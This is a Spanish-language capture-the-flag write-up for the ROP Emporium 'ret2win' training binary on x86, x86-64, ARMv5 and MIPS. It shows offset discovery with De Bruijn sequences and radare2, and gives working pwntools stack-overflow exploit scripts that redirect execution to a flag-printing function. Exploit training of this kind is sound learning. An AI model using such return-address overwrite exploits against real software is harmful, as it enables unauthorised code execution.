# ret2win

![2025-04-03-202444_1053x374_scrot](https://github.com/user-attachments/assets/dd203596-3a8c-4b37-9d8e-b17cdaf30a49)

## Indice
- [x86](x86)
- [x86-64](#x86_64)
- [ARMv5](#ARMv5)
- [Notas](#Notas)

# x86

## Intro
Lo primero que hacemos es revisar las propiedades del ejecutable. Hay varias utilidades para hacer esto (`checksec`,`rabin2`,`readelf`,etc...)

```
checksec --file=ret2win32
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols	  No	0		3		ret2win32
```

`No canary found`: Puede existir un buffer overflow 

`No PIE`: La direccion base del binario es fija

Probemos el programa:

```
./ret2win32
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!
zsh: segmentation fault  ./ret2win32
```

## Overflow

Perfecto, ocurre un desbordamiento de buffer, pero antes de explotarlo debemos encontrar a partir de que momento es que ocurre (la cantidad de bytes de relleno que necesitamos)

Yo suelo usar radare2 como disassembler/debugger/hex editor con un par de plugins como el decompilador de ghidra; pero puede usarse cualquiera de preferencia (`gdb`,`pwndbg`,`ghidra`,`IDAPro`,etc...)

Cuando ocurre un error de buffer overflow el mensaje se almacena en los logs del kernel de Linux. Podemos ver estos mensajes con `dmseg`

Antes de provocar el overflow es preferible ejecutar `sudo dmseg -C` para limpiar los registros y ver solo el mensaje que queremos

Con radare viene una herramienta llamada `ragg2` que nos permite usar [secuencias de De Bruijn](https://en.wikipedia.org/wiki/De_Bruijn_sequence)  para determinar el tamaño del buffer:
```
sudo dmesg -C

ragg2 -P 100 -r > sequence.txt

./ret2win32 < sequence.txt
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
zsh: segmentation fault  ./ret2win32 < sequence.txt
```

Ahora con `sudo dmseg <-t|-T>` podemos ver el resultado:
```
sudo dmesg -t
ret2win32[6565]: segfault at 41415041 ip 0000000041415041 sp 00000000ffe68940 error 14 likely on CPU 2 (core 2, socket 0)
Code: Unable to access opcode bytes at 0x41415017.
```

La cadena `41415041` es la secuencia en hexadecimal de 4 bytes donde ocurrio el desbordamiento, le pasamos estos datos a ragg2:
```
ragg2 -q 0x41415041  -i sequence.txt
Little endian: 44
Big endian: 43
```

Como x86 es little endian ahora sabemos que el desbordamiento ocurre a partir del byte 44

## Explotacion

Ahora revisemos el binario:
```
r2 -A ret2win
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
 -- It's not you, it's me.
[0x004005b0]> afl~sym
0x00400550    1      6 sym.imp.puts
0x00400560    1      6 sym.imp.system
0x00400570    1      6 sym.imp.printf
0x00400580    1      6 sym.imp.memset
0x00400590    1      6 sym.imp.read
0x004005a0    1      6 sym.imp.setvbuf
0x004005f0    4     37 sym.deregister_tm_clones
0x00400620    4     55 sym.register_tm_clones
0x004006e8    1    110 sym.pwnme
0x00400756    1     27 sym.ret2win
0x004007f0    1      2 sym.__libc_csu_fini
0x004007f4    1      9 sym._fini
0x00400780    4    101 sym.__libc_csu_init
0x004005e0    1      2 sym._dl_relocate_static_pie
0x00400528    3     23 sym._init
[0x004005b0]> s sym.ret2win ;pdf
/ 27: sym.ret2win ();
|           0x00400756      55             push rbp
|           0x00400757      4889e5         mov rbp, rsp
|           0x0040075a      bf26094000     mov edi, str.Well_done__Heres_your_flag: ; 0x400926 ; "Well done! Here's your flag:" ; const char *s
|           0x0040075f      e8ecfdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400764      bf43094000     mov edi, str._bin_cat_flag.txt ; 0x400943 ; "/bin/cat flag.txt" ; const char *string
|           0x00400769      e8f2fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0040076e      90             nop
|           0x0040076f      5d             pop rbp
\           0x00400770      c3             ret
[0x00400756]>
```

Vemos que la funcion ret2win hace una llamada a system("/bin/cat flag.txt")

Si revisamos sym.pwnme vemos la logica del programa:
```
[0x004006e7]> s sym.pwnme
[0x004006e8]> pdf
            ; CALL XREF from main @ 0x4006d2(x)
/ 110: sym.pwnme ();
| afv: vars(1:sp[0x28..0x28])
|           0x004006e8      55             push rbp
|           0x004006e9      4889e5         mov rbp, rsp
|           0x004006ec      4883ec20       sub rsp, 0x20
|           0x004006f0      488d45e0       lea rax, [var_20h]
|           0x004006f4      ba20000000     mov edx, 0x20               ; r8
|           0x004006f9      be00000000     mov esi, 0
|           0x004006fe      4889c7         mov rdi, rax
|           0x00400701      e87afeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x00400706      bf38084000     mov edi, str.For_my_first_trick__I_will_attempt_to_fit_56_bytes_of_user_input_into_32_bytes_of_stack_buffer_ ; 0x400838 ; "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!"
|           0x0040070b      e840feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400710      bf98084000     mov edi, str.What_could_possibly_go_wrong_ ; 0x400898 ; "What could possibly go wrong?"
|           0x00400715      e836feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0040071a      bfb8084000     mov edi, str.You_there__may_I_have_your_input_please__And_dont_worry_about_null_bytes__were_using_read____n ; 0x4008b8 ; "You there, may I have your input please? And don't worry about null bytes, we're using read()!\n"
|           0x0040071f      e82cfeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400724      bf18094000     mov edi, 0x400918           ; "> "
|           0x00400729      b800000000     mov eax, 0
|           0x0040072e      e83dfeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400733      488d45e0       lea rax, [var_20h]
|           0x00400737      ba38000000     mov edx, 0x38               ; '8' ; 56
|           0x0040073c      4889c6         mov rsi, rax
|           0x0040073f      bf00000000     mov edi, 0
|           0x00400744      e847feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x00400749      bf1b094000     mov edi, str.Thank_you_     ; 0x40091b ; "Thank you!"
|           0x0040074e      e8fdfdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400753      90             nop
|           0x00400754      c9             leave
\           0x00400755      c3             ret
[0x004006e8]>
```

Lo que debemos hacer es sobreescribir la direccion de retorno de sym.pwnme para que apunte a sym.ret2win

Si usamos el debugger de r2 y ponemos un breakpoint en  0x400749 nos percatamos de que despues de los datos que introducimos esta la direccion de retorno:

```
[0x7ff7ab4efb40]> dc
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAAAAAAAAAAAAAAAAAAAA
INFO: hit breakpoint at: 0x400749
[0x00400749]> pxQ 64@ rsp
0x7ffc3506b4b0 0x4141414141414141       <--- "AAAAAAAA"
0x7ffc3506b4b8 0x4141414141414141       <--- "AAAAAAAA"
0x7ffc3506b4c0 0x0a41414141414141       <--- "AAAAAAA"
0x7ffc3506b4c8 0x0000000000000000 section.
0x7ffc3506b4d0 0x00007ffc3506b4e0 rbp+16
0x7ffc3506b4d8 0x00000000004006d7 main+64          <--- Direccion de retorno
0x7ffc3506b4e0 0x0000000000000001 section.+1
0x7ffc3506b4e8 0x00007ff7ab2e5d68
INFO: hit breakpoint at: 0x400749
```

El binario no tiene PIE, eso significa que sus direcciones no cambian, la direccion de ret2win es fija

Debemos crear nuestra carga util con 44 bytes de relleno + la direccion de sym.ret2win:

``` python
from pwn import *
elf = context.binary = ELF("./ret2win32")
io = process("./ret2win32")

io.recv()

offset=b"A"*44
ret2win= p32(0x0804862c)

io.sendline(offset+ret2win)

io.success(io.recvall())
```

```
python3 ret2win32.py
[*] '/home/kalcast/Descargas/ret2win32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[+] Starting local process './ret2win32': pid 7067
[+] Receiving all data: Done (73B)
[*] Stopped process './ret2win32' (pid 7067)
/home/kalcast/venv/lib/python3.12/site-packages/pwnlib/log.py:347: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'success')
[+] Thank you!
    Well done! Here's your flag:
    ROPE{a_placeholder_32byte_flag!}
```

# x86_64

## Intro
```
 checksec --file=ret2win
[*] '/home/kalcast/Descargas/ret2win'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Mismo caso que la version x86

## Overflow

En x86-64 el kernel no muestra un mensaje detallado como para obtener el desplazamiento de manera precisa, hay varias vias que se pueden tomar, la primera es usar pwntools + pwndebug:

``` python
#!/bin/python3
from pwn import *
# set terminal gdb will run in
# replace 'kitty' with your terminal
# context.terminal = ['kitty']

# create payload
payload = cyclic(60, n=4)

# debug rop chain
io = gdb.debug('./ret2win32', '''
               b pwnme
               c
               ''')
# Escribir `continue` en pwndbg para observar el crash
# Escribir cyclic -l 0xvalor_en_la_cima_del_backtrace -n 4
io.sendline(payload)

# keep the program alive
io.interactive()
```

Otra es simplemente usar un debbuger solo como `gdb` o `radare2` o hacerlo por fuerza bruta

Un ejemplo usando r2 y ragg2:

Creamos input.txt y lo rellenamos con la secuencia de De Bruijn:
```
 ragg2 -P 100 -r > input.txt
```

Abrimos radare en modo depuracion, agregamos un breakpoint antes del retorno de la funcion y revisamos la cima de la pila:
```
└─$ r2 -d -A ret2win
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
ERROR: Cannot seek to unknown address '$S'
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Skipping type matching analysis in debugger mode (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
 -- You look great, by the way. Very healthy
[0x7fe2b4a1db40]> s sym.pwnme ;pdf
            ; CALL XREF from main @ 0x4006d2(x)
/ 110: sym.pwnme ();
| afv: vars(1:sp[0x28..0x28])
|           0x004006e8      55             push rbp
|           0x004006e9      4889e5         mov rbp, rsp
|           0x004006ec      4883ec20       sub rsp, 0x20
|           0x004006f0      488d45e0       lea rax, [var_20h]
|           0x004006f4      ba20000000     mov edx, 0x20               ; 32
|           0x004006f9      be00000000     mov esi, 0
|           0x004006fe      4889c7         mov rdi, rax
|           0x00400701      e87afeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x00400706      bf38084000     mov edi, str.For_my_first_trick__I_will_attempt_to_fit_56_bytes_of_user_input_into_32_bytes_of_stack_buffer_ ; 0x400838 ; "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!"
|           0x0040070b      e840feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400710      bf98084000     mov edi, str.What_could_possibly_go_wrong_ ; 0x400898 ; "What could possibly go wrong?"
|           0x00400715      e836feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0040071a      bfb8084000     mov edi, str.You_there__may_I_have_your_input_please__And_dont_worry_about_null_bytes__were_using_read____n ; 0x4008b8 ; "You there, may I have your input please? And don't worry about null bytes, we're using read()!\n"
|           0x0040071f      e82cfeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400724      bf18094000     mov edi, 0x400918           ; "> "
|           0x00400729      b800000000     mov eax, 0
|           0x0040072e      e83dfeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400733      488d45e0       lea rax, [var_20h]
|           0x00400737      ba38000000     mov edx, 0x38               ; '8' ; 56
|           0x0040073c      4889c6         mov rsi, rax
|           0x0040073f      bf00000000     mov edi, 0
|           0x00400744      e847feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x00400749      bf1b094000     mov edi, str.Thank_you_     ; 0x40091b ; "Thank you!"
|           0x0040074e      e8fdfdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400753      90             nop
|           0x00400754      c9             leave
\           0x00400755      c3             ret
[0x004006e8]> db  0x00400755;dc
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
Thank you!
INFO: hit breakpoint at: 0x400755
[0x00400755]> ATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
ERROR: Invalid command 'ATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh' (0x41)
[0x00400755]> pxQ 8 @rsp
0x7fff51f2db28 0x41415041414f4141
```

Pasamos estos valores a ragg2 para calcular el offset:
```
ragg2 -q 0x41415041414f4141 - i input.txt
Little endian: 40
Big endian: -1
```

## Exploit

Mismo caso que la version x86 solo que cambiando la direccion de ret2win y el offset:
``` python
from pwn import *
elf = context.binary = ELF("./ret2win")
io = process("./ret2win")

io.recv()

offset=b"A"*40
ret2win= p64(0x00400756)

io.sendline(offset+ret2win)

io.success(io.recvall())
```

# ARMv5

En ARM de 32 bits:
- Los registros `fp`, `sp` y `pc` son analogos a `ebp`, `esp` y `eip` en x86, es decir, frame pointer, stack pointer y program counter.
- El registro `lr` o link register contiene la direccion de retorno al hacer un `bl`.
- La instruccion `bl address` o branch with link, hace `lr=pc+4` (o `lr=pc+2` en thumb mode) y `pc=address`.
- El prologo de una funcion luce como `push {fp, lr}` (almacena `fp` en `[sp]` y `lr` en `[sp+4]`)
- El epilogo de una funcion suele ser `pop {fp, pc}` (carga `fp` desde `[sp]` y `pc` desde `[sp+4]`) 

## Exploit
```py
from pwn import *
io = process("./ret2win_armv5")

payload = b"A"*32 + b"B"*4 + p32(0x000105ec)
io.sendline(payload)
io.interactive()
```

# Notas

En este reto calculamos el offset, pero en los siguientes retos sera el mismo para su correspondiente arquitectura.

# MIPS

Ya teniendo experiencia con arquitecturas anteriores, me bastó un vistazo a [esta tabla de referencia de la arquitectura](https://www.kth.se/social/files/563c63c9f276547044e8695f/mips-ref-sheet.pdf) para comprender lo básico. En resumen:
- El equivalente a un "call" en esta arquitectura es un "jump and link", `jal label` y "jump and link register", `jalr rs`, ambos hacen `$ra := PC + 4; PC := reg(rs);`
- El prologo de una funcion comienza almacenando el registro ra en el stack, `sw ra, address` y el epilogo termina recuperandolo, `lw ra, address`.

```
# pwnme
|           0x004009a4      38000624       addiu a2, zero, 0x38        ; arg3
|           0x004009a8      1800c227       addiu v0, fp, 0x18
|           0x004009ac      25284000       move a1, v0
|           0x004009b0      25200000       move a0, zero
|           0x004009b4      6480828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x400b80:4]=0x8f998010 ; sym.imp.read
...
|           0x004009ec      3c00bf8f       lw ra, (var_3ch)
|           0x004009f0      3800be8f       lw fp, (var_38h)
|           0x004009f4      4000bd27       addiu sp, sp, 0x40
|           0x004009f8      0800e003       jr ra
```

La entrada de usuario se almacena en `fp - 0x18` (fp es frame pointer, equivalente a `ebp` en x86 y registro homónimo en arm32), y la dirección de retorno se ecuentra en `fp - 0x3c` , entonces se encuentra a un offset de 0x3c-0x18=36 bytes. 

```
└─$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*36 + b'\x00\x0a\x40\x00')" |  qemu-mipsel -L /usr/mipsel-linux-gnu ret2win_mipsel
ret2win by ROP Emporium
MIPS

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

Nota: Curiosamente se queda en un loop y no causa Segmentation Fault.

